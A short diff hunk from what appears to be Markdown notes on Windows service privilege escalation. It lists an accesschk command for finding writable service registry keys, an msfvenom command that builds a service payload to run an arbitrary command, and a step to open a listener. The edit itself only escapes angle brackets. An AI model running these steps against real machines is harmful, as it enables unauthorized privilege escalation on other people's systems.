@@ -234,7 +234,7 @@ Windows stores all the necessary data that is related to services in the registr
     * accesschk.exe –kvusw hklm\System\CurrentControleSet\Service
  
  * generate a payload:
-   * msfvenom –p windows/exec CMD=<Command> -f exe-services –o <service binery>
+   * msfvenom –p windows/exec CMD=\<Command> -f exe-services –o \<service binery>
  
  * open a listener
  
